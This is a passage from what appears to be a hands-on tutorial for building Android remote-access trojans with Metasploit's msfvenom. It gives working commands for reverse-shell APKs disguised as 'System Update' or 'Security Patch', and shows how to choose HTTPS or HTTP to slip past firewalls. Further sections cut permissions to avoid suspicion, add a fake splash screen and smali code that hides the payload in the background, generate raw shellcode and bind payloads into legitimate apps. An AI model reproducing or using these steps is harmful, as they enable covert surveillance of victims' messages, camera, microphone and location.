# android/shell_reverse_tcp           - Stageless simple shell

# List all output formats
msfvenom -l formats | grep -i android
# apk    - Android application package

# ═══════════════════════════════════════════════════════════════
#                    MSFVENOM OPTIONS EXPLAINED
# ═══════════════════════════════════════════════════════════════

# -p <payload>     : The payload to generate
#                     Example: android/meterpreter/reverse_tcp
#
# LHOST=<ip>       : YOUR IP address (listener IP)
#                     The payload will connect BACK to this IP
#                     Must be reachable from the target device
#
# LPORT=<port>     : YOUR port (listener port)
#                     The port your listener will be on
#                     Common choices: 4444, 4445, 5555
#
# -f <format>      : Output format
#                     For Android: always use "apk"
#
# -o <output>      : Output filename
#                     Example: payload.apk
#
# --app-name <name>: Display name of the app on the device
#                     Shows in app drawer and settings
#
# --app-icon <path>: Custom icon for the app
#                     PNG image file
#
# --launcher-name   : Launcher activity name
```

---

# PART 2: BUILDING ANDROID PAYLOADS

---

## Chapter 5: Understanding Android Payloads

### 5.1 What Happens When an Android Payload Executes?

Let's trace the complete lifecycle of what happens from the moment a victim installs and runs our payload:

```
ANDROID PAYLOAD EXECUTION LIFECYCLE:
│
│  ═══════════════════════════════════════════════════
│  STEP 1: USER INSTALLS THE APK
│  ═══════════════════════════════════════════════════
│
│  User taps APK file
│       ↓
│  Android Package Manager processes the APK:
│  ├── Verifies APK signature
│  ├── Checks requested permissions
│  ├── Copies DEX files to /data/app/<package>/
│  ├── Registers components (Activities, Services, etc.)
│  ├── Creates app data directory: /data/data/<package>/
│  └── Shows permission dialog to user
│       ↓
│  User taps "Install"
│       ↓
│  App is installed but NOT running yet
│
│  ═══════════════════════════════════════════════════
│  STEP 2: USER OPENS THE APP (or app auto-starts)
│  ═══════════════════════════════════════════════════
│
│  User taps app icon (or BOOT_COMPLETED triggers)
│       ↓
│  Android creates new process for the app
│       ↓
│  ART (Android Runtime) loads classes.dex into memory
│       ↓
│  Application class is instantiated
│       ↓
│  Application.onCreate() is called
│       ↓
│  ★★★ OUR PAYLOAD CODE EXECUTES HERE ★★★
│       ↓
│  The Payload class:
│  ├── Checks if it has INTERNET permission → YES
│  ├── Creates a new thread (to not block the UI)
│  ├── In the new thread:
│   │   ├── Opens a socket connection to LHOST:LPORT
│   │   ├── Sends initial handshake to our Metasploit listener
│   │   ├── Receives the Meterpreter stage
│   │   ├── Loads the stage into memory
│   │   └── Executes the stage
│  └── Original app's UI continues to display normally
│       ↓
│  User sees the LEGITIMATE APP working normally!
│  (They have NO idea the payload is running in background)
│
│  ═══════════════════════════════════════════════════
│  STEP 3: PAYLOAD CONNECTS TO YOUR LISTENER
│  ═══════════════════════════════════════════════════
│
│  Android Device                    Your Kali Machine
│  ┌──────────────┐                 ┌──────────────┐
│  │              │                 │              │
│  │  Payload     │  TCP Connect    │  Metasploit  │
│  │  running in  │ ──────────────→ │  Listener    │
│  │  background  │  (to LHOST:     │  (handler)   │
│  │              │   LPORT)        │              │
│  │              │                 │              │
│  │              │  "Hello, I'm    │              │
│  │              │   ready!"       │  Receives    │
│  │              │ ──────────────→ │  connection  │
│  │              │                 │              │
│  │              │  Meterpreter    │  Sends       │
│  │              │   Stage Code    │  Meterpreter │
│  │              │ ←────────────── │  stage       │
│  │              │                 │              │
│  │  Executes    │                 │              │
│  │  Meterpreter │  AES Encrypted  │              │
│  │  in memory   │ ←────────────→ │  SESSION     │
│  │              │  Communication  │  ESTABLISHED │
│  │              │                 │              │
│  └──────────────┘                 └──────────────┘
│
│  ═══════════════════════════════════════════════════
│  STEP 4: YOU HAVE A METERPRETER SESSION
│  ═══════════════════════════════════════════════════
│
│  On your Kali machine, you now see:
│  [*] Meterpreter session 1 opened (192.168.1.10:4444 → 192.168.1.50:xxxxx)
│  
│  meterpreter >
│  
│  You can now:
│  ├── Read SMS messages
│  ├── Access contacts
│  ├── Take photos
│  ├── Record audio
│  ├── Get GPS location
│  ├── Download files
│  ├── Browse the file system
│  ├── See installed apps
│  └── Much more...
```

### 5.2 Anatomy of the Payload APK

Let's see exactly what Msfvenom creates when we generate a payload:

```
PAYLOAD APK STRUCTURE (Generated by Msfvenom):
│
│  payload.apk
│  │
│  ├── AndroidManifest.xml
│  │   ├── package="com.metasploit.stage"
│  │   ├── ALL dangerous permissions requested
│  │   ├── Payload activity declared
│  │   ├── MainService declared
│  │   └── BootReceiver declared
│  │
│  ├── classes.dex
│  │   ├── com.metasploit.stage.Payload          (Entry Activity)
│  │   ├── com.metasploit.stage.MainService      (Background Service)
│  │   ├── com.metasploit.stage.BootReceiver     (Boot persistence)
│  │   ├── com.metasploit.stage.PayloadTrustManager (SSL bypass)
│  │   └── Metasploit connection and staging code
│  │
│  ├── res/
│  │   ├── layout/
│  │   │   └── main.xml                          (Empty/minimal layout)
│  │   ├── values/
│  │   │   └── strings.xml
│  │   └── drawable/
│  │       └── icon.png                          (Default icon)
│  │
│  ├── assets/
│  │   └── (empty or minimal)
│  │
│  └── META-INF/
│      └── (unsigned - we must sign it!)
│
│  ═══════════════════════════════════════════════════
│  IMPORTANT NOTES:
│  ═══════════════════════════════════════════════════
│
│  1. The package name is "com.metasploit.stage"
│     → Google Play Protect KNOWS this name!
│     → We should change it (more on this later)
│
│  2. ALL dangerous permissions are requested at once
│     → This looks suspicious to the user
│     → Legitimate apps request permissions gradually
│     → We can reduce permissions (more on this later)
│
│  3. The APK is UNSIGNED
│     → Android requires ALL APKs to be signed
│     → We MUST sign it before installation
│     → We'll create our own signing key
│
│  4. The app has a generic name and icon
│     → We should customize these for social engineering
│     → Make it look like a legitimate app
```

---

## Chapter 6: Building Standalone Payload APKs

### 6.1 Your First Android Payload (Step-by-Step)

Let's build a basic Android Meterpreter payload from scratch, understanding every single step:

#### Step 1: Find Your IP Address

Before generating the payload, we need our own IP address (the one the payload will connect back to):

```bash
# Find your IP address on the local network
ip addr show | grep "inet " | grep -v 127.0.0.1
# Example output: inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0

# OR use hostname command
hostname -I
# Example output: 192.168.1.10

# OR use ifconfig (if installed)
ifconfig | grep "inet " | grep -v 127.0.0.1

# ═══════════════════════════════════════════════════════════════
# IMPORTANT: Which IP to use?
# ═══════════════════════════════════════════════════════════════
#
# For LAB testing (same network):
#   Use your local IP: 192.168.1.10
#
# For REMOTE testing (different network):
#   Use your PUBLIC IP: curl ifconfig.me
#   You'll also need to set up port forwarding on your router
#
# For VPN testing:
#   Use your VPN IP: check tun0 interface
#   ip addr show tun0
#
# ═══════════════════════════════════════════════════════════════

# Store your IP in a variable for convenience
export MY_IP="192.168.1.10"
echo "My IP: $MY_IP"
```

#### Step 2: Choose a Port

```bash
# Choose a port for the listener
# Common choices:
#   4444 - Metasploit default (well-known, may be blocked)
#   4445 - Alternative
#   5555 - Less suspicious
#   8080 - Looks like HTTP traffic
#   443  - Looks like HTTPS traffic (requires root)
#   80   - Looks like HTTP traffic (requires root)

export MY_PORT="4444"
echo "My Port: $MY_PORT"
```

#### Step 3: Generate the Payload

```bash
# ═══════════════════════════════════════════════════════════════
# GENERATING BASIC ANDROID PAYLOAD
# ═══════════════════════════════════════════════════════════════
#
# This is the simplest command to generate an Android payload.
# It creates a standalone APK file that, when installed and
# opened on an Android device, connects back to our machine.
#
# ═══════════════════════════════════════════════════════════════

cd ~/android-pentest/payloads

# Generate the payload
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o basic_payload.apk

# ═══════════════════════════════════════════════════════════════
# EXPLANATION OF EACH OPTION:
# ═══════════════════════════════════════════════════════════════
#
# msfvenom                          - The payload generation tool
#
# -p android/meterpreter/reverse_tcp - The payload type:
#     android        = Target platform (Android)
#     meterpreter    = Payload type (full Meterpreter)
#     /reverse_tcp   = Connection method (target connects to us)
#
# LHOST=192.168.1.10                - Your IP address
#     The payload will connect TO this IP
#     Must be reachable from the target device
#
# LPORT=4444                        - Your port
#     The payload will connect TO this port
#     Your listener will be on this port
#
# -f apk                            - Output format
#     "apk" = Android Package format
#
# -o basic_payload.apk              - Output filename
#     The generated APK file name
#
# ═══════════════════════════════════════════════════════════════

# Expected output:
# [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
# [-] No arch selected, selecting arch: dalvik from the payload
# No encoder specified, outputting raw payload
# Payload size: 10190 bytes
# Saved as: basic_payload.apk

# Verify the file was created
ls -la basic_payload.apk
# -rw-r--r-- 1 user user 10240 Jul 11 10:30 basic_payload.apk

# Check file type
file basic_payload.apk
# basic_payload.apk: Java archive data (JAR)
# (APK is technically a ZIP/JAR file)
```

#### Step 4: Understanding What We Just Created

```bash
# Let's examine what Msfvenom generated for us

# Decompile with Apktool to see the structure
apktool d basic_payload.apk -o basic_payload_analysis

# Look at the directory structure
tree basic_payload_analysis/
# basic_payload_analysis/
# ├── AndroidManifest.xml
# ├── apktool.yml
# ├── original/
# ├── res/
# └── smali/
#     └── com/
#         └── metasploit/
#             └── stage/
#                 ├── MainActivity.smali
#                 ├── MainService.smali
#                 ├── Payload.smali
#                 └── ...

# Read the manifest
cat basic_payload_analysis/AndroidManifest.xml
# You'll see:
# - Package: com.metasploit.stage
# - Many dangerous permissions
# - Activity, Service, and Receiver declarations

# Read the main payload Smali code
cat basic_payload_analysis/smali/com/metasploit/stage/Payload.smali
# This is the actual payload code in Dalvik assembly

# Clean up the analysis
rm -rf basic_payload_analysis/
```

### 6.2 Customizing Your Payload APK

The basic payload works but looks suspicious. Let's make it look legitimate:

#### Adding a Custom App Name

```bash
# ═══════════════════════════════════════════════════════════════
# CUSTOM APP NAME
# ═══════════════════════════════════════════════════════════════
#
# By default, the payload shows as "Main Activity" in the app drawer.
# We can change this to anything we want.
#
# Good names for social engineering:
#   - "System Update"
#   - "Security Patch"
#   - "Google Play Services"
#   - "Device Manager"
#   - "WiFi Analyzer"
#   - "Battery Saver"
#   - "App Store"
#
# ═══════════════════════════════════════════════════════════════

msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Update" \
    -f apk \
    -o system_update.apk

# Now when installed, the app will show as "System Update"
# in the app drawer and in Settings → Apps
```

#### Adding a Custom Icon

```bash
# ═══════════════════════════════════════════════════════════════
# CUSTOM APP ICON
# ═══════════════════════════════════════════════════════════════
#
# A custom icon makes the payload look more legitimate.
# The icon should be a PNG file, ideally 192x192 pixels.
#
# You can find icons at:
#   - Google Images (search for app icons)
#   - Icon packs
#   - Create your own
#
# ═══════════════════════════════════════════════════════════════

# First, let's find/create an icon
# For testing, we can create a simple icon
# (In real scenario, use a legitimate-looking icon)

# Download a system update icon (example)
# wget https://example.com/update_icon.png -O /tmp/update_icon.png

# For now, let's create a placeholder
convert -size 192x192 xc:blue -fill white \
    -gravity center -pointsize 24 \
    -annotate 0 "UPDATE" \
    /tmp/update_icon.png

# Generate payload with custom icon and name
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Update" \
    --app-icon /tmp/update_icon.png \
    -f apk \
    -o system_update_with_icon.apk

# Now the app looks like a legitimate system update!
```

#### Using HTTPS Instead of TCP

```bash
# ═══════════════════════════════════════════════════════════════
# HTTPS PAYLOAD (MORE STEALTHY)
# ═══════════════════════════════════════════════════════════════
#
# HTTPS payloads are better because:
#   1. Traffic is encrypted (can't be inspected)
#   2. Looks like normal web browsing
#   3. Port 443 is rarely blocked
#   4. Harder for network monitoring to detect
#
# ═══════════════════════════════════════════════════════════════

msfvenom -p android/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    --app-name "Security Update" \
    -f apk \
    -o security_update_https.apk

# Note: Using LPORT=443 requires root privileges for the listener
# Use sudo when starting the listener later
```

#### Using HTTP Payload (Bypass Firewalls)

```bash
# ═══════════════════════════════════════════════════════════════
# HTTP PAYLOAD (FIREWALL BYPASS)
# ═══════════════════════════════════════════════════════════════
#
# HTTP payloads use port 80 by default.
# Most firewalls allow outbound HTTP traffic.
#
# ═══════════════════════════════════════════════════════════════

msfvenom -p android/meterpreter/reverse_http \
    LHOST=192.168.1.10 \
    LPORT=8080 \
    --app-name "App Store" \
    -f apk \
    -o appstore_http.apk
```

#### Reducing Permissions (Less Suspicious)

```bash
# ═══════════════════════════════════════════════════════════════
# FEWER PERMISSIONS
# ═══════════════════════════════════════════════════════════════
#
# By default, Android payloads request ALL permissions.
# This is suspicious! A "System Update" shouldn't need
# CAMERA or RECORD_AUDIO.
#
# We can reduce permissions after generation using Apktool.
# (Covered in detail in Chapter 10)
#
# For now, just know that the default payload requests:
#   - INTERNET (required)
#   - ACCESS_NETWORK_STATE
#   - ACCESS_WIFI_STATE
#   - READ_PHONE_STATE
#   - CAMERA
#   - RECORD_AUDIO
#   - READ_SMS, SEND_SMS, RECEIVE_SMS
#   - READ_CONTACTS
#   - READ/WRITE_EXTERNAL_STORAGE
#   - ACCESS_FINE_LOCATION
#   - RECEIVE_BOOT_COMPLETED
#   - WAKE_LOCK
#
# We'll reduce these in the binding chapter.
#
# ═══════════════════════════════════════════════════════════════
```

### 6.3 Complete Payload Generation Examples

Here's a reference of all the payload generation commands you'll need:

```bash
# ═══════════════════════════════════════════════════════════════
#              COMPLETE PAYLOAD GENERATION REFERENCE
# ═══════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────
# EXAMPLE 1: Basic payload for lab testing
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o payloads/basic.apk


# ─────────────────────────────────────────────────
# EXAMPLE 2: Disguised as system update
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Update" \
    --app-icon /tmp/icon.png \
    -f apk \
    -o payloads/system_update.apk


# ─────────────────────────────────────────────────
# EXAMPLE 3: HTTPS encrypted payload
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    --app-name "Security Patch" \
    -f apk \
    -o payloads/security_patch.apk


# ─────────────────────────────────────────────────
# EXAMPLE 4: HTTP payload (firewall bypass)
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter/reverse_http \
    LHOST=192.168.1.10 \
    LPORT=8080 \
    --app-name "Device Manager" \
    -f apk \
    -o payloads/device_manager.apk


# ─────────────────────────────────────────────────
# EXAMPLE 5: Simple shell (smaller, less features)
# ─────────────────────────────────────────────────
msfvenom -p android/shell/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o payloads/simple_shell.apk


# ─────────────────────────────────────────────────
# EXAMPLE 6: Stageless payload (single piece)
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter_reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "WiFi Manager" \
    -f apk \
    -o payloads/wifi_manager_stageless.apk


# ─────────────────────────────────────────────────
# EXAMPLE 7: Using custom LPORT (non-standard)
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=8443 \
    --app-name "Cloud Sync" \
    -f apk \
    -o payloads/cloud_sync.apk


# ─────────────────────────────────────────────────
# EXAMPLE 8: Multiple payloads for redundancy
# ─────────────────────────────────────────────────
# Sometimes one payload gets blocked. Generate multiple:
for port in 4444 4445 5555 8080 8443; do
    msfvenom -p android/meterpreter/reverse_tcp \
        LHOST=192.168.1.10 \
        LPORT=$port \
        -f apk \
        -o payloads/payload_port_${port}.apk
    echo "Generated payload on port $port"
done

# Verify all payloads
ls -la payloads/
```

---

## Chapter 7: Customizing Payload APKs

### 7.1 Post-Generation Customization with Apktool

After Msfvenom generates the basic payload, we can customize it further using Apktool. This is where we transform a basic payload into a convincing-looking app.

```bash
# ═══════════════════════════════════════════════════════════════
# FULL CUSTOMIZATION WORKFLOW
# ═══════════════════════════════════════════════════════════════
#
# Step 1: Generate basic payload with Msfvenom
# Step 2: Decompile with Apktool
# Step 3: Modify manifest, resources, and code
# Step 4: Recompile with Apktool
# Step 5: Sign the APK
# Step 6: Test on device
#
# ═══════════════════════════════════════════════════════════════

cd ~/android-pentest

# ─────────────────────────────────────────────────
# STEP 1: Generate basic payload
# ─────────────────────────────────────────────────
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o payloads/basic_payload.apk

# ─────────────────────────────────────────────────
# STEP 2: Decompile with Apktool
# ─────────────────────────────────────────────────
apktool d payloads/basic_payload.apk -o decompiled/custom_payload

# Verify decompilation
ls decompiled/custom_payload/
# Should see: AndroidManifest.xml, smali/, res/, etc.

# ─────────────────────────────────────────────────
# STEP 3: Customize the app
# ─────────────────────────────────────────────────
```

#### Changing the App Name

```bash
# The app name is stored in res/values/strings.xml
# Let's change it from "Main Activity" to something legitimate

cat decompiled/custom_payload/res/values/strings.xml
# You'll see something like:
# <resources>
#     <string name="app_name">Main Activity</string>
# </resources>

# Change the app name
sed -i 's/<string name="app_name">.*<\/string>/<string name="app_name">System Update<\/string>/' \
    decompiled/custom_payload/res/values/strings.xml

# Verify the change
cat decompiled/custom_payload/res/values/strings.xml
# Should now show: <string name="app_name">System Update</string>
```

#### Changing the App Icon

```bash
# The app icon is in res/mipmap-*/ directories
# Common sizes:
#   mipmap-mdpi:    48x48 pixels
#   mipmap-hdpi:    72x72 pixels
#   mipmap-xhdpi:   96x96 pixels
#   mipmap-xxhdpi:  144x144 pixels
#   mipmap-xxxhdpi: 192x192 pixels

# Create icon files (if you have ImageMagick installed)
convert -size 48x48 xc:blue -fill white -gravity center \
    -pointsize 10 -annotate 0 "UPD" /tmp/icon_48.png
convert -size 72x72 xc:blue -fill white -gravity center \
    -pointsize 14 -annotate 0 "UPD" /tmp/icon_72.png
convert -size 96x96 xc:blue -fill white -gravity center \
    -pointsize 18 -annotate 0 "UPD" /tmp/icon_96.png
convert -size 144x144 xc:blue -fill white -gravity center \
    -pointsize 28 -annotate 0 "UPD" /tmp/icon_144.png
convert -size 192x192 xc:blue -fill white -gravity center \
    -pointsize 36 -annotate 0 "UPD" /tmp/icon_192.png

# Copy icons to the decompiled APK
cp /tmp/icon_48.png decompiled/custom_payload/res/mipmap-mdpi/ic_launcher.png
cp /tmp/icon_72.png decompiled/custom_payload/res/mipmap-hdpi/ic_launcher.png
cp /tmp/icon_96.png decompiled/custom_payload/res/mipmap-xhdpi/ic_launcher.png
cp /tmp/icon_144.png decompiled/custom_payload/res/mipmap-xxhdpi/ic_launcher.png
cp /tmp/icon_192.png decompiled/custom_payload/res/mipmap-xxxhdpi/ic_launcher.png

echo "Icons replaced!"
```

#### Reducing Permissions (Making it Less Suspicious)

```bash
# ═══════════════════════════════════════════════════════════════
# PERMISSION REDUCTION
# ═══════════════════════════════════════════════════════════════
#
# The default payload requests ALL permissions, which is very
# suspicious. Let's reduce to only what's needed for basic
# Meterpreter functionality.
#
# MINIMUM REQUIRED PERMISSIONS:
#   INTERNET (required for connection)
#   ACCESS_NETWORK_STATE (for network info)
#   ACCESS_WIFI_STATE (for WiFi info)
#   READ_PHONE_STATE (for device info)
#   RECEIVE_BOOT_COMPLETED (for persistence)
#   WAKE_LOCK (to stay awake)
#
# OPTIONAL PERMISSIONS (add if needed):
#   CAMERA (for taking photos)
#   RECORD_AUDIO (for recording)
#   READ_SMS (for reading messages)
#   READ_CONTACTS (for contacts)
#   ACCESS_FINE_LOCATION (for GPS)
#   READ/WRITE_EXTERNAL_STORAGE (for files)
#
# ═══════════════════════════════════════════════════════════════

# Edit the manifest
nano decompiled/custom_payload/AndroidManifest.xml

# REMOVE these suspicious permissions:
# <uses-permission android:name="android.permission.CAMERA" />
# <uses-permission android:name="android.permission.RECORD_AUDIO" />
# <uses-permission android:name="android.permission.READ_SMS" />
# <uses-permission android:name="android.permission.SEND_SMS" />
# <uses-permission android:name="android.permission.READ_CONTACTS" />
# <uses-permission android:name="android.permission.CALL_PHONE" />
# <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
# <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
# <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

# KEEP these minimum permissions:
# <uses-permission android:name="android.permission.INTERNET" />
# <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
# <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
# <uses-permission android:name="android.permission.READ_PHONE_STATE" />
# <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
# <uses-permission android:name="android.permission.WAKE_LOCK" />

# For a "System Update" app, the above permissions are reasonable.
# CAMERA would be suspicious for a system update!
```

#### Adding a Splash Screen (Makes it Look Legitimate)

```bash
# ═══════════════════════════════════════════════════════════════
# ADDING A SPLASH SCREEN
# ═══════════════════════════════════════════════════════════════
#
# When the user opens the app, instead of seeing a blank screen,
# show a convincing "System Update" splash screen.
# This makes the app look legitimate while the payload runs.
#
# ═══════════════════════════════════════════════════════════════

# Create a layout file for the splash screen
cat > decompiled/custom_payload/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#FFFFFF"
    android:padding="32dp">

    <!-- App Icon -->
    <ImageView
        android:layout_width="96dp"
        android:layout_height="96dp"
        android:src="@mipmap/ic_launcher"
        android:layout_marginBottom="24dp" />

    <!-- Title -->
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="System Update"
        android:textSize="24sp"
        android:textColor="#333333"
        android:textStyle="bold"
        android:layout_marginBottom="8dp" />

    <!-- Subtitle -->
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Checking for updates..."
        android:textSize="16sp"
        android:textColor="#666666"
        android:layout_marginBottom="32dp" />

    <!-- Progress Bar -->
    <ProgressBar
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        style="?android:attr/progressBarStyleHorizontal"
        android:layout_width="200dp"
        android:indeterminate="true"
        android:layout_marginBottom="16dp" />

    <!-- Status Text -->
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Your device is up to date"
        android:textSize="14sp"
        android:textColor="#999999" />

</LinearLayout>
EOF

echo "Splash screen layout created!"
```

#### Adding a Custom Launcher Activity (Shows Splash, Then Closes)

```bash
# ═══════════════════════════════════════════════════════════════
# CUSTOM LAUNCHER ACTIVITY
# ═══════════════════════════════════════════════════════════════
#
# We want the app to:
# 1. Show splash screen
# 2. Run payload in background
# 3. After a few seconds, show "Device is up to date"
# 4. Close the app (payload continues in background)
#
# ═══════════════════════════════════════════════════════════════

# Create the custom MainActivity Smali file
cat > decompiled/custom_payload/smali/com/metasploit/stage/MainActivity.smali << 'SMALI'
.class public Lcom/metasploit/stage/MainActivity;
.super Landroid/app/Activity;

# This is our custom launcher activity
# It shows a splash screen and starts the payload service

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"

    # Call super.onCreate(savedInstanceState)
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Set the splash screen layout
    const/high16 v0, 0x7f04
    invoke-virtual {p0, v0}, Lcom/metasploit/stage/MainActivity;->setContentView(I)V

    # Start the payload service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Lcom/metasploit/stage/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    # Close activity after 3 seconds
    new-instance v0, Landroid/os/Handler;
    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
    new-instance v1, Lcom/metasploit/stage/MainActivity$1;
    invoke-direct {v1, p0}, Lcom/metasploit/stage/MainActivity$1;-><init>(Lcom/metasploit/stage/MainActivity;)V
    const-wide/16 v2, 0xBB8  # 3000 milliseconds
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
SMALI

echo "Custom MainActivity created!"
```

---

## Chapter 8: Advanced Payload Generation

### 8.1 Stageless Payloads (Larger but More Reliable)

```bash
# ═══════════════════════════════════════════════════════════════
# STAGELESS PAYLOADS
# ═══════════════════════════════════════════════════════════════
#
# STAGED (android/meterpreter/reverse_tcp):
#   - Two-step: stager first, then stage
#   - Smaller initial payload
#   - Requires listener to be ready
#   - Can fail if connection drops during stage transfer
#
# STAGELESS (android/meterpreter_reverse_tcp):
#   - One-step: complete payload in one piece
#   - Larger file size
#   - More reliable
#   - Works even if listener starts late
#   - Note: UNDERSCORE instead of SLASH
#
# When to use stageless:
#   - Unstable network connections
#   - When you can't guarantee listener is running first
#   - When you need maximum reliability
#
# ═══════════════════════════════════════════════════════════════

# Stageless reverse TCP
msfvenom -p android/meterpreter_reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Service" \
    -f apk \
    -o payloads/stageless_tcp.apk

# Stageless reverse HTTPS (most reliable)
msfvenom -p android/meterpreter_reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    --app-name "System Service" \
    -f apk \
    -o payloads/stageless_https.apk

# Note the size difference:
ls -la payloads/basic.apk payloads/stageless_tcp.apk
# stageless is larger because it contains the complete Meterpreter
```

### 8.2 Raw Shellcode Generation

```bash
# ═══════════════════════════════════════════════════════════════
# RAW SHELLCODE (for advanced users)
# ═══════════════════════════════════════════════════════════════
#
# Sometimes you need raw shellcode (e.g., for custom injection).
# Msfvenom can output raw bytes.
#
# ═══════════════════════════════════════════════════════════════

# Generate raw Android shellcode
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o payloads/shellcode.bin

# Check the size
ls -la payloads/shellcode.bin
# This raw binary can be injected into other APKs

# Generate shellcode as Java byte array (for Smali injection)
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f dalvik \
    -o payloads/payload.dex

# The .dex file can be loaded directly by Android
```

---

# PART 3: BINDING PAYLOADS WITH LEGITIMATE APPS

---

## Chapter 9: What is APK Binding?

### 9.1 Understanding APK Binding

APK binding is the process of combining a legitimate application with our payload, creating a single APK that:
1. Runs the **original app normally** (user sees expected behavior)
2. **Silently executes our payload** in the background
3. Appears as **one single app** to the user

```
╔═══════════════════════════════════════════════════════════════════╗
║                    APK BINDING EXPLAINED                          ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  BEFORE BINDING:                                                   ║
║                                                                    ║
║  ┌─────────────────┐      ┌─────────────────┐                     ║
║  │  Legitimate App  │      │   Payload APK    │                     ║
║  │  (Calculator)    │      │  (Meterpreter)   │                     ║
║  │                  │      │                  │                     ║
║  │  - MainActivity  │      │  - Payload       │                     ║
║  │  - Math Engine   │      │  - MainService   │                     ║
║  │  - UI Layouts    │      │  - BootReceiver  │                     ║
║  │                  │      │                  │                     ║
║  │  User sees:      │      │  Connects to:    │                     ║
║  │  Calculator      │      │  Your listener   │                     ║
║  └─────────────────┘      └─────────────────┘                     ║
║                                                                    ║
║  AFTER BINDING:                                                    ║
║                                                                    ║
║  ┌─────────────────────────────────────────────┐                  ║
║  │          BOUND APK (Calculator + Payload)    │                  ║
║  │                                              │                  ║
║  │  ┌─────────────────────────────────────┐    │                  ║
║  │  │         Original Calculator          │    │                  ║
║  │  │                                      │    │                  ║
║  │  │  - MainActivity (calculator UI)      │    │                  ║
║  │  │  - Math Engine (works normally)      │    │                  ║
║  │  │  - UI Layouts (looks normal)         │    │                  ║
║  │  │                                      │    │                  ║
║  │  │  User interaction: NORMAL            │    │                  ║
║  │  └─────────────────────────────────────┘    │                  ║
║  │                                              │                  ║
║  │  ┌─────────────────────────────────────┐    │                  ║
║  │  │       Injected Payload (HIDDEN)      │    │                  ║
║  │  │                                      │    │                  ║
║  │  │  - Payload class (connection code)   │    │                  ║
║  │  │  - MainService (background process)  │    │                  ║
║  │  │  - BootReceiver (auto-start)         │    │                  ║
║  │  │                                      │    │                  ║
║  │  │  Runs in background, INVISIBLE       │    │                  ║
║  │  └─────────────────────────────────────┘    │                  ║
║  │                                              │                  ║
║  │  App Name: "Calculator"                      │                  ║
║  │  App Icon: Calculator icon                   │                  ║
║  │  User sees: Calculator working normally      │                  ║
║  │  Behind scenes: Meterpreter running!         │                  ║
║  │                                              │                  ║
║  └─────────────────────────────────────────────┘                  ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 9.2 How Binding Works (Technical Deep Dive)

```
BINDING PROCESS - TECHNICAL DETAILS:
│
│  STEP 1: Decompile both APKs
│  ├── Original app → Smali code + resources
│  └── Payload APK → Smali code + resources
│
│  STEP 2: Copy payload Smali into original app
│  ├── Copy com/metasploit/ folder to original app's smali/
│  ├── This adds payload classes to the original app
│  └── Both codebases now exist in same APK
│
│  STEP 3: Merge AndroidManifest.xml
│  ├── Add payload permissions (INTERNET, etc.)
│  ├── Add payload Service declaration
│  ├── Add payload Activity declaration (if needed)
│  └── Add BootReceiver for persistence
│
│  STEP 4: Hook payload into original app's lifecycle
│  ├── Edit the original app's launcher Activity
│  ├── Add code to start payload Service in onCreate()
│  ├── When user opens app → payload starts silently
│  └── Original app's code continues normally
│
│  STEP 5: Rebuild the combined APK
│  ├── Apktool recompiles everything
